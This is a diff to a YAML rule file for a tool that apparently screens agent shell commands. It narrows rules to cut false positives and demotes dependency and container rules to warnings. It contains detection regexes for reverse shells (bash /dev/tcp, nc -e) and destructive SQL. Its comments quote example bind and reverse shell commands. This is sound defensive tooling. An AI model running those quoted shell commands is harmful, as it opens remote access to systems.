@@ -9,6 +9,16 @@ version: "1.0"
 settings:
   # Categories that trigger a blocking verdict in enforce mode.
   # Override in .prismor/policy.yaml to add or remove categories.
+  #
+  # Deliberately NOT blocking (warn/telemetry only), so routine development is
+  # never hard-stopped in enforce mode — these carry high-frequency dev commands:
+  #   dependency_hygiene  — global/git/url installs, unsafe install flags,
+  #                         lockfile delete/edit, vendored-script exec. Genuine
+  #                         supply-chain THREATS (typosquat, dependency
+  #                         confusion, OSV-vulnerable versions, malicious
+  #                         postinstall) stay under `dependency_risk` and block.
+  #   container_risk      — privileged/host-mounted containers (dev use of
+  #                         docker-in-docker, hardware access) — warn, not block.
   block_categories:
     - destructive_command
     - secret_exfiltration
@@ -257,12 +267,12 @@ rules:
     patterns:
       - 'bash\s+-i\s+>&\s*/dev/tcp/'
       - '/dev/tcp/[^\s/]+'
-      # nc listener with -e/-c/--exec (explicit reverse shell)
-      - '\bnc\b[^\n]*\s-[a-z]*l[a-z]*[^\n]*\s(-e|-c|--exec|--sh-exec)\b'
-      # nc with combined -lvp/-lp/-pl flags (local-port + listen, typical reverse-shell setup)
-      - '\bnc\b[^\n]*\s-[a-z]*(?:lp|pl|lvp|pvl)[a-z]*\b'
-      # Separate nc -l and -p flags
-      - '\bnc\b[^\n]*\s-[a-z]*l[a-z]*\b[^\n]*\s-[a-z]*p[a-z]*\b'
+      # nc that wires a shell to the socket via -e/-c/--exec — covers both a bind
+      # shell (`nc -lvp 4444 -e /bin/sh`) and a reverse shell (`nc -e /bin/bash
+      # 10.0.0.1 4444`). A bare `nc -lvp <port>` listener with NO shell-exec flag
+      # is a common dev/testing action (port probe, throwaway server) and is
+      # intentionally NOT matched — only nc that actually spawns a shell is one.
+      - '\bnc\b[^\n]*\s(?:-e|-c|--exec|--sh-exec)\b'
       - 'python3?\s+-c\s+.*(?:exec|eval|import\s+os)'
       - 'perl\s+-e\s+.*(?:socket|exec)'
       - 'node\s+-e\b[^\n]*(child_process|execSync|spawnSync|\bexec\s*\()'
@@ -444,12 +454,21 @@ rules:
   - id: db-modification
     severity: HIGH
     category: db_modification
-    title: Flags DROP TABLE, DELETE FROM, TRUNCATE in shell commands
+    title: Flags DROP TABLE/DATABASE, TRUNCATE, and unscoped DELETE/UPDATE (no WHERE)
     event_types: [shell]
     fields: [command]
+    # Only genuinely destructive statements. A targeted DELETE/UPDATE *with* a
+    # WHERE clause, an INSERT, or an ALTER (routine migrations / everyday dev
+    # work) is intentionally NOT matched — those were high-frequency false
+    # positives that hard-blocked normal development in enforce mode.
     patterns:
-      - '\b(DROP\s+(TABLE|DATABASE)|TRUNCATE\s+TABLE|DELETE\s+FROM|UPDATE\s+\w+\s+SET|ALTER\s+TABLE|INSERT\s+INTO)\b'
-      - '(?:mysql|psql|sqlite3)\s+.*(?:-e\s+|-c\s+)[''"]?\s*(?:DROP|DELETE|UPDATE|ALTER|INSERT|TRUNCATE)'
+      # Irreversible schema / whole-object destruction
+      - '\b(DROP\s+(TABLE|DATABASE|SCHEMA)|TRUNCATE(\s+TABLE)?)\b'
+      # DELETE / UPDATE with NO WHERE clause — wipes or overwrites the whole table
+      - '\bDELETE\s+FROM\s+["`\[\]\w.]+\s*(?![^;]*\bWHERE\b)'
+      - '\bUPDATE\s+["`\[\]\w.]+\s+SET\b(?![^;]*\bWHERE\b)'
+      # Same destructive ops routed through a db CLI one-liner
+      - '(?:mysql|psql|sqlite3)\b[^\n]*(?:-e|-c)\s+["'']?\s*(?:DROP\s+(?:TABLE|DATABASE|SCHEMA)|TRUNCATE|DELETE\s+FROM\s+\S+\s*(?![^;]*\bWHERE\b)|UPDATE\s+\S+\s+SET\b(?![^;]*\bWHERE\b))'
     action: block
 
   # ── HIGH: Database dumps / sensitive queries ──────────────────────────
@@ -997,13 +1016,16 @@ rules:
   - id: package-registry-poisoning
     severity: HIGH
     category: remote_execution
-    title: Detects package manager registry manipulation
+    title: Detects package manager registry redirection to a non-official host
     event_types: [shell]
     fields: [command]
+    # Only flag redirection to a NON-official registry. Pointing --index-url at
+    # the canonical PyPI, or `npm config set registry` at the canonical npm/yarn
+    # registry, is normal (private mirrors excluded by name too) — matching those
+    # was a false positive that hard-blocked routine installs.
     patterns:
-      - '\bpip3?\s+install\b[^\n]*--index-url\b'
-      - '\bpip3?\s+install\b[^\n]*--extra-index-url\b'
-      - '\bnpm\s+config\s+set\s+registry\b'
+      - '\bpip3?\s+install\b[^\n]*--(?:extra-)?index-url[=\s]+["'']?https?://(?!pypi\.org|files\.pythonhosted\.org)'
+      - '\bnpm\s+config\s+set\s+registry[=\s]+["'']?https?://(?!registry\.npmjs\.org|registry\.yarnpkg\.com)'
     action: warn
 
   # ── HIGH: Python one-liner network exfiltration ──────────────────
@@ -1026,7 +1048,7 @@ rules:
   # ── HIGH: Package install from URL/git (not registry) ────────────
   - id: pkg-install-from-url
     severity: HIGH
-    category: dependency_risk
+    category: dependency_hygiene
     title: Package installed from URL or git source instead of registry
     event_types: [shell]
     fields: [command]
@@ -1041,7 +1063,7 @@ rules:
   # ── MEDIUM: Package install with unsafe flags ────────────────────
   - id: pkg-install-unsafe-flags
     severity: MEDIUM
-    category: dependency_risk
+    category: dependency_hygiene
     title: Package install bypasses safety checks (--no-deps, --force, --ignore-scripts)
     event_types: [shell]
     fields: [command]
@@ -1055,7 +1077,7 @@ rules:
   # ── MEDIUM: Global package install ───────────────────────────────
   - id: pkg-install-global
     severity: MEDIUM
-    category: dependency_risk
+    category: dependency_hygiene
     title: Global package install affects all projects on this machine
     event_types: [shell]
     fields: [command]
@@ -1092,7 +1114,7 @@ rules:
   # ── HIGH: Lockfile manual edit ───────────────────────────────────
   - id: lockfile-direct-edit
     severity: HIGH
-    category: dependency_risk
+    category: dependency_hygiene
     title: Manual edit of lockfile — lockfiles should only be modified by package managers
     event_types: [shell]
     fields: [command]
@@ -1104,7 +1126,7 @@ rules:
   # ── HIGH: Lockfile deletion ──────────────────────────────────────
   - id: lockfile-deletion
     severity: HIGH
-    category: dependency_risk
+    category: dependency_hygiene
     title: Lockfile deletion forces fresh dependency resolution — supply chain risk
     event_types: [shell]
     fields: [command]
@@ -1138,7 +1160,7 @@ rules:
   # ── HIGH: npm/yarn install from git+https (supply chain) ─────────
   - id: npm-git-install
     severity: HIGH
-    category: dependency_risk
+    category: dependency_hygiene
     title: npm/yarn/pnpm install from git URL bypasses registry auditing
     event_types: [shell]
     fields: [command]
@@ -1156,7 +1178,7 @@ rules:
   # ./ci/test.sh) are untouched. See the T1-T15 coverage benchmark.
   - id: execute-vendored-script
     severity: HIGH
-    category: dependency_risk
+    category: dependency_hygiene
     title: Executes a shell script from a vendored/third-party directory (unvetted supply-chain code)
     event_types: [shell]
     fields: [command]
@@ -1271,7 +1293,7 @@ rules:
   # ── CRITICAL: Privileged container / host-root mount (container escape) ──
   - id: container-escape
     severity: CRITICAL
-    category: privilege_escalation
+    category: container_risk
     title: Privileged container or host-root mount (container escape to host)
     event_types: [shell]
     fields: [command]
